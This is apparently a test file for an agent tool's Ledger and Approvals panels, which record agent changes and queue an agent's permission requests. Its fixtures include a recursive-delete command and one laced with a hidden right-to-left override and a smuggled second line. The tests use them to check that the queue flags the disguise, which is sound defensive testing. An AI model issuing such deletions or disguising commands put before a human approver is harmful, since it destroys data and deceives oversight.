// Lane BF3: Factory's Main track readers (src/agent/devices/receiptBindings.ts, FactoryDeviceChain.tsx, AgentDockTileBody.tsx) — the
// Ledger (software-factory:ledger, DLW §19.13, its widget §23.9) and Approvals (software-factory:approvals, §19.16, its widget §23.10).
//
// Channels:
// - REAL: two changes of the root register's change horizon as read on 16 Oct (Control/.central/source-change-control.json, the
//   reading the kernel's `central` inspect carries: an unattributed removal and a native operation's addition). No change in any
//   horizon on this machine names an agent, so the agent's change below is a FIXTURE shaped as ctrl/src/source_horizon.rs SourceChange.
// - FIXTURE: AIKit's consent request (desktop/cradle/src/encounter/client.ts NativePermission; the real views read on 16 Oct held none),
//   and the ports Approvals is handed. Every port records its calls: no approval is answered, no owner state is written.
// - SCRIPTED: the two catalogue designs rendered through the runtime's host (deviceHost.HostedDevice) to static markup.
import test from 'node:test'
import assert from 'node:assert/strict'
import {register} from 'node:module'
import {readFileSync} from 'node:fs'

const compiler = new URL('../node_modules/typescript/lib/typescript.js', import.meta.url).href
register(`data:text/javascript,${encodeURIComponent(`
import ts from ${JSON.stringify(compiler)};
import {readFile} from 'node:fs/promises';
export async function resolve(specifier,context,next){
  try{return await next(specifier,context)}catch(error){
    if(!specifier.startsWith('.'))throw error;
    if(specifier.endsWith('.js')){try{return await next(specifier.slice(0,-3)+'.ts',context)}catch{}}
    for(const suffix of ['.ts','.tsx','/index.ts','/index.tsx']){try{return await next(specifier+suffix,context)}catch{}}
    throw error;
  }
}
export async function load(url,context,next){
  if(url.endsWith('.css'))return {format:'module',shortCircuit:true,source:'export default null'};
  if(url.endsWith('.ts')||url.endsWith('.tsx')){
    const source=await readFile(new URL(url).pathname,'utf8');
    const {outputText}=ts.transpileModule(source,{compilerOptions:{target:ts.ScriptTarget.ES2022,module:ts.ModuleKind.ESNext,jsx:ts.JsxEmit.ReactJSX},fileName:url});
    return {format:'module',shortCircuit:true,source:outputText};
  }
  return next(url,context);
}`)}`, {parentURL: import.meta.url})

globalThis.document = {getElementById: () => null, createElement: () => ({}), head: {appendChild: () => {}}, documentElement: {}}
const {createElement} = await import('react')
const {renderToStaticMarkup} = await import('react-dom/server')
const family = await import('../src/inhabitants/familyManifest.ts')
const {loadAgentShellFamilies} = await import('../src/inhabitants/loadAgentShellFamilies.ts')
const {designKey} = await import('../src/frame/devices/designs.ts')
const host = await import('../src/frame/devices/deviceHost.tsx')
const door = await import('../src/frame/devices/deviceDoor.ts')
const widgets = await import('../src/frame/widgets/deviceWidgets.tsx')
const bind = await import('../src/agent/devices/designBindings.ts')
const rec = await import('../src/agent/devices/receiptBindings.ts')
const {design: ledgerDesign} = await import('../src/inhabitants/catalogue/panels/software-factory__ledger.tsx')
const {design: approvalsDesign} = await import('../src/inhabitants/catalogue/panels/software-factory__approvals.tsx')

family.resetFamilyManifestsForTest()
loadAgentShellFamilies()

const views = ['folded', 'compact', 'whole', 'full', 'widget']
const hosted = (designed, binding) => views.map(view => renderToStaticMarkup(createElement(host.HostedDevice, {designed, binding, view, nav: {}})))
const escaped = text => text.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
const read = path => readFileSync(new URL(`../src/${path}`, import.meta.url), 'utf8')

// ---- REAL (root horizon, 16 Oct) ----------------------------------------------------------------------------------------------
const REMOVED = {schema: 'central.source-change/v1', change_ref: 'central:change:control:root:830', cursor: 830, world_ref: 'control:root',
  source_ref: 'central:source:control:root:Control/user/flows/o-i-the-mark-9ad0e0e9.expression.json', source_path: 'Control/user/flows/o-i-the-mark-9ad0e0e9.expression.json',
  source_roles: ['personal-human-source-aperture'], provenance: 'unresolved', standing: 'unspecified', treatment: 'control-user', agent_retrieval_allowed: true,
  before_revision: 'central.content-fnv1a64/v1:8894:7cff0f12f97985f2', after_revision: null, kind: 'removed', observed_at_unix_seconds: 1792108013, provider: 'central.filesystem-reconcile/v1'}
const NATIVE = {schema: 'central.source-change/v1', change_ref: 'central:change:control:root:821', cursor: 821, world_ref: 'control:root',
  source_ref: 'central:source:control:root:Control/agents/now/clearings/e3fd/now.json', source_path: 'Control/agents/now/clearings/e3fd/now.json', source_roles: ['now-clearing'],
  provenance: 'agent-maintained', standing: 'current-development-state', treatment: 'generated-derived', agent_retrieval_allowed: true, before_revision: null,
  after_revision: 'central.content-fnv1a64/v1:776:c8e9c7c0bcf630f7', kind: 'added', observed_at_unix_seconds: 1791751348, provider: 'central.filesystem-reconcile/v1',
  actor: 'central.now.allocate', actor_kind: 'native-operation'}
// ---- FIXTURE -----------------------------------------------------------------------------------------------------------------
const AGENT = {...NATIVE, change_ref: 'central:change:control:root:831', cursor: 831, source_path: 'Control/agents/now/day/2026-10-16.md', kind: 'modified',
  before_revision: 'central.content-fnv1a64/v1:1:aa', after_revision: 'central.content-fnv1a64/v1:2:bb', observed_at_unix_seconds: 1792157400,
  actor: 'agent:aletheia', actor_kind: 'agent', agent_session_ref: 'agent-session/fx-aletheia'}
const horizon = changes => ({schema: 'central.source-change-horizon/v1', world_ref: 'control:root', cursor: 831, sources: [], changes})
const TIME = {state: 'ready', action: 'central.time.policy', data: {schema: 'central.civil-time-reading/v1', civil_date: '2026-10-16', local_time: '12:00', revision: 'r',
  source_ref: 's', policy: {timezone: 'Europe/London', day_boundary_minutes: 0, automatic_day_rollover: false}}}
const ground = changes => ({sources: {state: 'ready', action: 'projectcentral.change.horizon', data: horizon(changes)}, time: TIME})

const SESSION = {sessionRef: 'agent-session/fx-aletheia', purpose: 'Explain run', agentRef: 'agent:aletheia', agentName: 'aletheia', agentAccepted: true, spaceRef: 's',
  spaceLabel: null, depth: 1, parentRef: 's', group: false, memberRefs: [], tasks: [], needle: null, telemetryOn: true, budget: {used: null, max: null}, disclosure: null}
const CONSENT = {native_request_id: 'req-7', native_session_id: 'n', tool_call_id: 'call-1', raw: {}, provenance: ['aikit'],
  tool_call: {kind: 'execute', title: 'Bash: rm -rf dist', rawInput: {command: 'rm -rf dist', cwd: '/Users/admin/Central/Work/O-I'}},
  choices: [{option_id: 'o1', label: 'Allow', kind: 'allow_once'}, {option_id: 'o2', label: 'Always', kind: 'allow_always'}, {option_id: 'o3', label: 'Reject', kind: 'reject_once'}]}
const PERMIT = {ref: 'aikit.encounter.permission', enabled: true, reason: null}
const encounter = (permissions, actions = [PERMIT]) => ({permissions, actions})

test('the Ledger and Approvals are keyed to their designs exactly, from Software Factory\'s admitted faces', () => {
  const devices = rec.receiptDevices()
  for (const [device, design] of [[devices.ledger, ledgerDesign], [devices.approvals, approvalsDesign]]) {
    assert.ok(device, `${design.id}: the family admits the face`)
    assert.equal(designKey(device.family, device.face.id), design.id)
  }
})

test('the Ledger reads Central\'s change horizon: a change an agent made is a receipt (landed, in the civil zone); the real changes no agent made are none', () => {
  bind.resetHolds()
  const real = rec.ledgerValues({ground: ground([NATIVE, REMOVED]), groundError: null, holds: bind.chainHolds()})
  assert.equal(real.receipts, '[]', 'the real horizon names no agent: an empty list, read — not an absent one')
  assert.deepEqual([real.light, real.today], ['lit', '2026-10-16'])
  const values = rec.ledgerValues({ground: ground([NATIVE, AGENT, REMOVED]), groundError: null, holds: bind.chainHolds()})
  // 13:30 UTC is 14:30 in the policy's zone (Europe/London, BST): the Day's own clock.
  // REPLACED (#757 part two): a receipt is keyed by its ref, the change's change_ref, and keeps the horizon's number as `n`
  // (w757-designs-what-the-build-found.test.mjs, the Ledger keyed by ref).
  assert.deepEqual(JSON.parse(values.receipts), [{ref: 'central:change:control:root:831', n: 831, agent: 'agent:aletheia', outcome: 'landed', day: '2026-10-16', time: '14:30',
    files: [{path: 'Control/agents/now/day/2026-10-16.md', kind: 'modified', from: 'central.content-fnv1a64/v1:1:aa', to: 'central.content-fnv1a64/v1:2:bb'}],
    session: 'agent-session/fx-aletheia'}])
  assert.deepEqual([values.period, values.agent, values.outcome, values.order], ['today', 'all', 'all', 'newest'], 'the manual\'s starting filters, the view\'s own')
  for (const key of ['run', 'used', 'cap', 'tokensIn', 'tokensOut', 'spend', 'task']) assert.equal(values[key], undefined, `${key}: no reading`)
  const refused = {ground: {sources: {state: 'failed', action: 'projectcentral.change.horizon', error: {message: 'horizon locked'}}, time: TIME}, groundError: null, holds: bind.chainHolds()}
  assert.deepEqual([rec.ledgerValues(refused).light, rec.ledgerValues(refused).receipts], ['dark', undefined])
  assert.equal(rec.ledgerWaits(refused), 'horizon locked', 'the owner\'s words')
  assert.deepEqual(rec.ledgerValues({ground: null, groundError: null, holds: bind.chainHolds()}), {period: 'today', agent: 'all', outcome: 'all', order: 'newest'}, 'unread: nothing but the view')
  for (const [key, value] of Object.entries(ledgerDesign.defaults)) {
    if (['light', 'period', 'agent', 'outcome', 'order', 'today'].includes(key)) continue // the view's starts are the manual's; today is the civil day
    assert.notDeepEqual([key, values[key]], [key, value], `${key} carries the design's default`)
  }
})

test('the Ledger only reads: its filters are the view\'s; Open log selects the receipt\'s agent session, or says why it cannot', async () => {
  bind.resetHolds()
  const opened = []
  const binding = rec.ledgerBinding({ground: ground([AGENT, NATIVE]), groundError: null, holds: bind.chainHolds()}, {openSession: ref => { opened.push(ref); return null }})
  // REPLACED (#757 part two): the receipt you read and Open log go by the receipt's ref, never a number (w757-designs-what-the-build-found
  // .test.mjs, the Ledger keyed by ref); the horizon's number names no receipt.
  binding.local.outcome('landed')
  binding.local.task(AGENT.change_ref)
  const after = rec.ledgerValues({ground: ground([AGENT]), groundError: null, holds: bind.chainHolds()})
  assert.deepEqual([after.outcome, after.task], ['landed', AGENT.change_ref])
  await binding.write([{key: 'openLog', value: AGENT.change_ref}])
  assert.deepEqual(opened, ['agent-session/fx-aletheia'])
  await assert.rejects(() => binding.write([{key: 'openLog', value: 'central:change:control:root:7'}]), /not in the Ledger/)
  await assert.rejects(() => binding.write([{key: 'openLog', value: 831}]), /not in the Ledger/, 'the horizon\'s number is no key')
  const gone = rec.ledgerBinding({ground: ground([AGENT]), groundError: null, holds: bind.chainHolds()}, {openSession: () => 'This agent session is not among Factory\'s sessions here.'})
  await assert.rejects(() => gone.write([{key: 'openLog', value: AGENT.change_ref}]), /not among Factory's sessions/)
  await assert.rejects(() => binding.write([{key: 'receipts', value: '[]'}]), /is a reading/)
  bind.resetHolds()
})

// REPLACED (#788): "Approvals: the Default answer is the Gateway's approvals key — the same read and the same write". §19.14: "the default
// answer is the Gateway's Approvals (§19.2). Approvals shows them and never sets them", and the redrawn design (software-factory__approvals
// .tsx) draws no `approvals`. The default answer is read and set on the Gateway alone: its `approvals` row, through kernel
// harness_agent_control configure {approvals} (designBindings.ts GATEWAY_KEYS; factory-devices.test.mjs, factory-design-binding.test.mjs).
// Approvals is handed no Gateway.
test('REPLACED (#788) — Approvals reads and sets no default answer (the Gateway\'s, §19.2, §19.14); the queue is the shown session\'s consent requests', async () => {
  bind.resetHolds()
  const calls = []
  const ports = {permission: async (id, decision) => { calls.push(['permission', id, decision]) }}
  const input = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, ports)
  assert.equal(binding.values.approvals, undefined, 'no default answer is read here: it is the Gateway\'s')
  assert.equal(binding.writes('approvals'), false, 'nor set here')
  assert.equal(binding.standing.approvals, undefined, 'and no standing claims the key')
  await assert.rejects(() => binding.write([{key: 'approvals', value: 'ask'}]), /approvals is a reading/)
  // be2n ruling 1: the row carries the request as it was sent, for its raw view (PermissionCard.tsx permissionAsSent).
  assert.deepEqual(JSON.parse(binding.values.queue), [{id: 'req-7', kind: 'request', text: 'rm -rf dist', who: 'aletheia', where: 'execute', session: 'Explain run',
    raw: JSON.stringify({tool_call: CONSENT.tool_call, choices: CONSENT.choices}, null, 1)}])
  // REPLACED (#772): the view starts at §19.14's defaults — Show All (the design's words; Both is no Show of the redrawn design), Order
  // Oldest first, Follow On (approvals-answers-binding.test.mjs).
  assert.deepEqual([binding.values.light, binding.values.show, binding.values.order, binding.values.follow], ['lit', 'all', 'oldest', true])
  await binding.write([{key: 'allowOnce', value: 'req-7'}])
  await binding.write([{key: 'allowAlways', value: 'req-7'}])
  await binding.write([{key: 'deny', value: 'req-7'}])
  assert.deepEqual(calls, [
    ['permission', 'req-7', {outcome: 'selected', option_id: 'o1'}],
    ['permission', 'req-7', {outcome: 'selected', option_id: 'o2'}],
    ['permission', 'req-7', {outcome: 'selected', option_id: 'o3'}],
  ], 'each answer is the harness\'s own choice, through the session\'s encounter (recorded here, never sent)')
  await assert.rejects(() => binding.write([{key: 'allowOnce', value: 'req-gone'}]), /no longer waits/)
  // REPLACED (#804): "Wait and On no answer refused naming the configure op they lack" — they are the Agent's (§19.4) and Approvals shows
  // them and never sets them (§19.14): readings here, absent with the reading they wait for, and no write is taken.
  for (const key of ['wait', 'noAnswer']) {
    assert.match(binding.standing[key].disabled, /no reading reaches it yet/, key)
    assert.equal(binding.writes(key), false, `${key}: never set here`)
    await assert.rejects(() => binding.write([{key, value: 'x'}]), /is a reading/)
  }
  // REPLACED (lane W9): Changes has its owner (Central's projectcentral.source.return_comment); a chain carries it by wrapping the binding
  // (sourceReturnComment.ts withReturnComments). Unwrapped, it stands disabled saying no comment hand is passed.
  assert.equal(binding.standing.changes.disabled, rec.APPROVALS_REFUSE.changes)
  await assert.rejects(() => binding.write([{key: 'changes', value: 'x'}]), /passes no comment hand/)
  // REPLACED (W2): Approve writes through Central's acceptance where the chain hands its port (tests/w2-hookups-binding.test.mjs); with
  // none passed it stands disabled in those words.
  assert.equal(binding.standing.approve.disabled, rec.APPROVE_UNWIRED)
  await assert.rejects(() => binding.write([{key: 'approve', value: 'x'}]), /no acceptance port is passed here/)
  assert.equal(calls.length, 3, 'no refusal dispatched anything')
  binding.local.show('requests')
  binding.local.pick('req-7')
  // The Review page's own key (be2r ruling 4; DLW build ruling 2026-11-12): the review or recognition it stands on is held as the
  // choice is, so the page still knows it after it is left and come back to. Unheld, it is absent.
  assert.equal(rec.approvalsValues({...input, holds: bind.chainHolds()}).reviewing, undefined)
  binding.local.reviewing('rcg-8')
  const after = rec.approvalsValues({...input, holds: bind.chainHolds()})
  assert.deepEqual([after.show, after.pick, after.reviewing], ['requests', 'req-7', 'rcg-8'])
  bind.resetHolds()
})

test('Approvals reads the Wait and On no answer of the asking session from AIKit, and marks a request held past its Wait (§19.12, §19.14, round 860)', async () => {
  bind.resetHolds()
  const NOW = 1_800_000_000_000
  // AIKit's settings of the shown session: its track's wait and no_answer, and what its executor did with its asks (asks.held, asks.helper).
  const settings = {track: {wait: 900, no_answer: 'hold'}, asks: {held: [{request: 'req-7', past_wait_at_unix_ms: NOW - 60_000}], helper: {}, last: null}}
  const input = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds(), settings, nowUnixMs: NOW}
  const binding = rec.approvalsBinding(input, {})
  assert.deepEqual([binding.values.wait, binding.values.noAnswer], [900, 'hold'], 'the asking agent\'s Scope, as AIKit reads it')
  for (const key of ['wait', 'noAnswer']) {
    assert.equal(binding.standing[key], undefined, `${key}: read`)
    assert.equal(binding.writes(key), false, `${key}: still never set here (§19.14)`)
  }
  const [row] = JSON.parse(binding.values.queue)
  assert.equal(row.id, 'req-7')
  assert.equal(row.age, 960, 'it has waited its Wait and a minute more, so it floats past the Wait line')
  assert.equal(row.flag, rec.HELD_PAST_WAIT)
  assert.match(rec.HELD_PAST_WAIT, /^Held past its Wait: nobody answered, and On no answer holds it for you/)
  // What the Decision helper did with a request it did not answer stands as the request's flag, in AIKit's words.
  const passed = {...settings, asks: {held: [], helper: {'req-7': {passed: 'The decision helper picked none: the request waits for you'}}, last: null}}
  assert.equal(JSON.parse(rec.approvalsValues({...input, settings: passed}).queue)[0].flag, 'The decision helper picked none: the request waits for you')
  // REPLACED (round 860): unread, they were missing ops on Hermes' approvals timeout; they wait for AIKit's settings of the shown session now.
  const unread = rec.approvalsBinding({...input, settings: null}, {})
  assert.equal(unread.standing.wait.disabled, rec.APPROVALS_ABSENT.wait)
  assert.match(unread.standing.wait.disabled, /^The Wait on the asking agent's Scope: no reading reaches it yet — AIKit's settings of the shown session/)
  for (const key of ['wait', 'noAnswer']) assert.doesNotMatch(unread.standing[key].disabled, /missing op|Hermes/, key)
  // The chain hands Approvals the shown session's settings.
  assert.match(read('agent/devices/FactoryDeviceChain.tsx'), /settings: shownSettings/)
  bind.resetHolds()
})

test('Approvals with nothing to answer: no session shown, no consent verb, or nothing waiting — each said', async () => {
  bind.resetHolds()
  const none = rec.approvalsBinding({session: null, encounter: null, holds: bind.chainHolds()}, {})
  assert.equal(none.values.queue, undefined, 'no session shown: the queue is not read')
  assert.match(none.standing.allowOnce.disabled, /No session is shown/)
  // REPLACED (#788): "the default answer refused where the Gateway is not drawn" and "the Gateway's standing for the shared key": Approvals
  // shares no key with the Gateway now; the Gateway's own row stands for its `approvals` (factory-devices.test.mjs).
  const refused = rec.approvalsBinding({session: SESSION, encounter: encounter([CONSENT], [{...PERMIT, enabled: false, reason: 'There is no active provider turn'}]), holds: bind.chainHolds()}, {permission: async () => assert.fail('not sent')})
  assert.equal(refused.standing.deny.disabled, 'There is no active provider turn', 'the encounter\'s own reason')
  await assert.rejects(() => refused.write([{key: 'deny', value: 'req-7'}]), /no active provider turn/)
  const empty = rec.approvalsValues({session: SESSION, encounter: encounter([]), holds: bind.chainHolds()})
  assert.deepEqual([empty.queue, empty.light], ['[]', 'dark'], 'nothing waits: an empty queue, read')
})

test('the two designs draw on their bindings in all five views — no NaN, no undefined, never their fixtures — each refusal drawn as why', () => {
  bind.resetHolds()
  host.resetHost()
  const cases = [
    [ledgerDesign, rec.ledgerBinding({ground: ground([AGENT, NATIVE]), groundError: null, holds: bind.chainHolds()}, {openSession: () => null}), /re-plan port|Cairn|review #482|fixtures\/handoff/, []],
    // The manual (§19.14): how long a request waits and what happens then are the Wait and On no answer set on the asking agent's Scope, and the default
    // answer is the Gateway's; Approvals shows them and sets none, so no Wait control stands here to carry its refusal.
    [approvalsDesign, rec.approvalsBinding({session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}, {}),
      /setModel|Kite|recursive delete/, []],
  ]
  for (const [design, binding, fixture, reasons] of cases) {
    const drawn = hosted(design, binding)
    drawn.forEach((markup, index) => {
      assert.match(markup, new RegExp(`data-device-view="${views[index]}"`), `${design.id} ${views[index]} draws`)
      assert.doesNotMatch(markup, /\bNaN\b|undefined/, `${design.id} ${views[index]}: no absent key drawn as text`)
      assert.doesNotMatch(markup, /data-device-fault/, `${design.id} ${views[index]}: its own view drew`)
      assert.doesNotMatch(markup, fixture, `${design.id} ${views[index]}: its fixture never stands in`)
    })
    const all = drawn.join('\n')
    for (const why of reasons) assert.ok(all.includes(escaped(why)), `${design.id}: a refused control says why (${why})`)
  }
  assert.ok(hosted(approvalsDesign, cases[1][1]).join('\n').includes('rm -rf dist'), 'the queue draws the session\'s real request')
  host.resetHost()
})

test('the rail\'s Ledger and Approvals are their devices\' own widgets (§23.9, §23.10), the rail\'s own way; the chain stands Approvals on the Main track, the Ledger on none', () => {
  for (const [widgetId, deviceId, design] of [['ledger', rec.LEDGER_ID, ledgerDesign], ['approvals', rec.APPROVALS_ID, approvalsDesign]]) {
    const registered = {id: widgetId, name: widgetId, mark: 'chain', Body: () => null}
    widgets.claimRailWidget(widgetId, deviceId)
    const claimed = widgets.claimedWidget(registered)
    assert.equal(claimed.bare, true)
    const device = rec.receiptDevices()[widgetId === 'ledger' ? 'ledger' : 'approvals']
    const binding = widgetId === 'ledger' ? rec.ledgerBinding({ground: ground([AGENT]), groundError: null, holds: bind.chainHolds()}, {openSession: () => null})
      : rec.approvalsBinding({session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}, {})
    door.publishDevice(deviceId, {device, binding})
    try {
      const tile = renderToStaticMarkup(createElement(claimed.Body, {subject: null, pinned: false}))
      assert.match(tile, /data-device-size="widget"/)
      assert.match(tile, new RegExp(`data-device-design="${design.id}"|data-device-design="generic"`))
    } finally { door.publishDevice(deviceId, null) }
  }
  // The claims stand with the tiles' marks (agentDockTiles.ts), before any tile body loads; the bodies stay in AgentDockTileBody.tsx.
  const tiles = read('agent/agentDockTiles.ts') + read('agent/AgentDockTileBody.tsx')
  assert.match(tiles, /claimRailWidget\('ledger', LEDGER_ID\)/)
  assert.match(tiles, /claimRailWidget\('approvals', APPROVALS_ID\)/)
  assert.doesNotMatch(tiles, /Encounter task \(ledger basis\)|approval hooks/, 'the raw task-record receipts are gone (MOVED)')
  const view = read('agent/devices/FactoryDeviceChain.tsx')
  // REPLACED (lane W1-Factory; DLW §16.1, §19.13): the Ledger is a monitor — its tile on the rail and its Full in a pane, never on a chain;
  // it stays published for both. Approvals is an effect on the Main track (§19.14).
  assert.doesNotMatch(view, /placed\(LEDGER_ID/, 'the Ledger stands on no chain (§19.13 "Kind: monitor")')
  assert.match(read('agent/devices/AgentRailDevices.tsx'), /publish\(LEDGER_ID, ledger\)/, 'and stays published, for the rail and a pane, by the rail\'s publisher in every mode')
  assert.match(view, /case 'approvals': return placed\(APPROVALS_ID, receipts\.approvals, approvalsDesignBinding, [^\n]*'data-main-slot': 'approvals'/, 'Approvals on the Main track (§19.14)')
  // REPLACED (#788): "the Gateway's values and the shown session" — Approvals is handed the shown session, never the Gateway (§19.14).
  assert.match(view, /approvalsBinding\(\{session: shownTrack, encounter:/, 'the shown session')
  assert.doesNotMatch(view, /approvalsBinding\(\{gateway|gatewayDesignBinding,\s*\{\.\.\.\(actions/, 'no Gateway handed to Approvals')
  assert.match(read('agent/devices/AgentRailDevices.tsx'), /useCentralGroundAnswer\(transport\)/, 'the window\'s one ground answer')
  assert.doesNotMatch(read('agent/devices/receiptBindings.ts'), /\.defaults\[|\.fixtures|catalogue\/panels\//, 'the bindings read no design default or fixture')
})

// be2n ruling 1 (DLW build ruling 2026-11-11): the Approvals queue answers a consent request too. Where the words it shows are not the
// ones sent, the item says so in the card's own line and opens the request's raw form; on the faces with no room for the raw form the
// line stands on the row and on Approve, and says where the raw form is. Approve sends the harness's own choice by its id: no word of
// the request, shown or sent, goes with it.
test('the queue says when what it shows of a request is not what was sent, with its raw form; Approve sends only the harness\'s choice (be2n ruling 1)', async () => {
  bind.resetHolds()
  const SET = /[\p{Cf}\u{2028}\u{2029}\u{3164}]/u
  const LINE = 'The command holds characters that are not shown here. Show raw has it as it was sent.'
  const LACED = {...CONSENT, native_request_id: 'req-8', tool_call: {kind: 'execute', title: 'Bash', rawInput: {command: 'rm -rf ./build\u{202e}\nls', cwd: '/srv/app'}}}
  const rows = rec.queueRows([LACED, CONSENT], SESSION)
  // be2o ruling 3: the queue draws the command on one line, so a command of two lines says that too, after the card's line.
  const NOTE = `${LINE} The command has 2 lines, drawn as one here.`
  assert.deepEqual([rows[0].text, rows[0].differs], ['rm -rf ./build\nls', NOTE])
  assert.ok(rows[0].raw.includes('rm -rf ./build\\u202e\\nls') && !SET.test(rows[0].raw), rows[0].raw)
  assert.equal('differs' in rows[1], false, 'a plain request carries no line')
  assert.equal(rows[1].raw, JSON.stringify({tool_call: CONSENT.tool_call, choices: CONSENT.choices}, null, 1), 'and its raw form all the same')
  const calls = []
  const input = {session: SESSION, encounter: encounter([LACED, CONSENT]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { calls.push([id, decision]) }})
  const drawn = pick => { binding.local.pick(pick); return hosted(approvalsDesign, {...binding, values: rec.approvalsValues({...input, holds: bind.chainHolds()})}) }
  const laced = drawn('req-8'), pane = laced[views.indexOf('full')]
  assert.ok(pane.includes(`<p class="ap-note ap-differs" role="note" data-flagged="true">${NOTE}</p>`), pane)
  assert.ok(pane.includes('<details class="ap-raw" open=""><summary>Show raw</summary><pre class="ap-cmd">'), pane)
  assert.ok(pane.includes('rm -rf ./build\\u202e\\nls'), 'the raw form, with the override as its escape')
  for (const [at, markup] of laced.entries()) assert.ok(!SET.test(markup), `${views[at]}: nothing of the set is drawn`)
  const bands = laced.filter((_, at) => views[at] !== 'full').join('\n')
  // REPLACED (be2o ruling 2): Approve said the line and still approved from a face with no room for it. It opens the pane instead.
  assert.ok(bands.includes(escaped(`Opens the pane, where the request stands as it was sent. Approve it there. ${NOTE}`)), 'the button in Approve\'s place says what it does where there is no room for the raw form')
  assert.ok(!bands.includes(escaped(`Approves the request. Nothing else is allowed by it. ${LINE}`)), 'and no longer approves from there')
  assert.ok(bands.includes(`class="dp-row-why" aria-label="${escaped(`${NOTE} Show raw is in the pane.`)}"`), 'and the row carries the line as its reason')
  const plain = drawn('req-7')
  assert.ok(plain[views.indexOf('full')].includes('<details class="ap-raw"><summary>Show raw</summary><pre class="ap-cmd">'), 'a plain request keeps its raw form closed')
  assert.ok(!plain[views.indexOf('full')].includes('ap-differs'))
  const alone = {session: SESSION, encounter: encounter([CONSENT]), holds: bind.chainHolds()}
  assert.ok(!hosted(approvalsDesign, rec.approvalsBinding(alone, {})).join('\n').includes('Show raw is in the pane.'), 'a queue of plain requests says nothing of it on any face')
  await binding.write([{key: 'allowOnce', value: 'req-8'}])
  await binding.write([{key: 'deny', value: 'req-8'}])
  assert.deepEqual(calls, [['req-8', {outcome: 'selected', option_id: 'o1'}], ['req-8', {outcome: 'selected', option_id: 'o3'}]], 'the answer names the choice and carries nothing of the command')
  bind.resetHolds()
})

// ── be2o (DLW build ruling 2026-11-11): the follow-ups of the review of be2n (O-I #968) ─────────────────────────────────────────────

/** Every element of a view, its components run: the tree is walked inside one server render, so a component's hooks have a render to
 * stand in. A press is then the element's own handler, called as the browser would call it. */
const nodesOf = element => {
  let nodes = []
  const walk = node => {
    if (Array.isArray(node)) { node.forEach(walk); return }
    if (!node || typeof node !== 'object' || !('props' in node)) return
    nodes.push(node)
    const type = node.type
    if (typeof type === 'function') walk(type(node.props))
    else if (type && typeof type === 'object' && typeof type.type === 'function') walk(type.type(node.props))
    else walk(node.props.children)
  }
  const Probe = () => { nodes = []; walk(element); return null }
  const said = console.error
  console.error = (first, ...rest) => { if (!String(first).includes('useLayoutEffect does nothing on the server')) said(first, ...rest) }
  try { renderToStaticMarkup(createElement(Probe)) } finally { console.error = said }
  return nodes
}
/** The SDK's actions of a label (Action elements, before they are run), and the pane's own buttons of a label. */
const actionsOf = (nodes, label) => nodes.filter(node => typeof node.type === 'function' && node.props.label === label && 'onPress' in node.props)
const buttonsOf = (nodes, label) => nodes.filter(node => node.type === 'button' && node.props.children === label)
/** A view's props on a binding, its sets and its openings of the pane recorded in order. */
const propsOn = (binding, values = binding.values, nav = undefined) => {
  const sets = []
  return {sets, p: {v: values, owner: values, set: (key, value) => { sets.push([key, value]) }, nav: nav ?? {full: () => { sets.push(['nav.full']) }}, page: 'queue', setPage() {}, standing: binding.standing}}
}
const SECOND = {...CONSENT, native_request_id: 'req-9', tool_call_id: 'call-9', tool_call: {kind: 'execute', title: 'Bash: ls', rawInput: {command: 'ls', cwd: '/srv/app'}},
  choices: [{option_id: 'second-once', label: 'Allow', kind: 'allow_once'}, {option_id: 'second-always', label: 'Always', kind: 'allow_always'}, {option_id: 'second-no', label: 'Reject', kind: 'reject_once'}]}
const LINE_2O = 'The command holds characters that are not shown here. Show raw has it as it was sent.'
const LACED_2O = {...CONSENT, native_request_id: 'req-8', tool_call: {kind: 'execute', title: 'Bash', rawInput: {command: 'rm -rf ./build\u{202e}', cwd: '/srv/app'}}}
const picked = (input, pick) => ({...rec.approvalsValues(input), pick})

// be2o ruling 1: every answer in Approvals is sent with the id of the item it was pressed on: the chosen item's on the whole view and
// in the pane, each card's own on the rail's tile. The binding finds the request by that id, and one that is gone sends nothing.
test('each Approvals answer goes to the request it was pressed on, on the whole view, the tile and the pane; a request that is gone sends nothing (be2o ruling 1)', async () => {
  bind.resetHolds()
  const calls = []
  const input = {session: SESSION, encounter: encounter([CONSENT, SECOND]), holds: bind.chainHolds()}
  const binding = rec.approvalsBinding(input, {permission: async (id, decision) => { calls.push([id, decision]) }})
  // The rail's tile: one card for each request, each with its own Approve and Deny.
  const tile = propsOn(binding)
  const cards = nodesOf(approvalsDesign.widget(tile.p))
  assert.equal(actionsOf(cards, 'Approve').length, 2)
  actionsOf(cards, 'Approve')[1].props.onPress()
  actionsOf(cards, 'Deny')[0].props.onPress()
  assert.deepEqual(tile.sets, [['allowOnce', 'req-9'], ['deny', 'req-7']], 'each card names its own request')
  // The whole view and the pane answer the chosen item.
  for (const view of ['whole', 'full']) {
    for (const pick of ['req-9', 'req-7']) {
      const face = propsOn(binding, picked(input, pick))
      const nodes = nodesOf(approvalsDesign[view](face.p))
      const approve = view === 'full' ? buttonsOf(nodes, 'Approve')[0].props.onClick : actionsOf(nodes, 'Approve')[0].props.onPress
      const deny = view === 'full' ? buttonsOf(nodes, 'Deny')[0].props.onClick : actionsOf(nodes, 'Deny')[0].props.onPress
      approve(); deny()
      assert.deepEqual(face.sets, [['allowOnce', pick], ['deny', pick]], `${view}: the chosen item's id`)
    }
  }
  await binding.write([{key: 'allowOnce', value: 'req-9'}])
  await binding.write([{key: 'allowAlways', value: 'req-9'}])
  await binding.write([{key: 'deny', value: 'req-7'}])
  assert.deepEqual(calls, [['req-9', {outcome: 'selected', option_id: 'second-once'}], ['req-9', {outcome: 'selected', option_id: 'second-always'}], ['req-7', {outcome: 'selected', option_id: 'o3'}]],
    'each answer reaches the request it names, with that request\'s own choice')
  const later = rec.approvalsBinding({...input, encounter: encounter([SECOND])}, {permission: async (id, decision) => { calls.push([id, decision]) }})
  for (const key of ['allowOnce', 'allowAlways', 'deny']) await assert.rejects(() => later.write([{key, value: 'req-7'}]), /That request no longer waits: AIKit reports it answered or gone\./, key)
  assert.equal(calls.length, 3, 'the request that still waits was not answered in its place')
  bind.resetHolds()
})

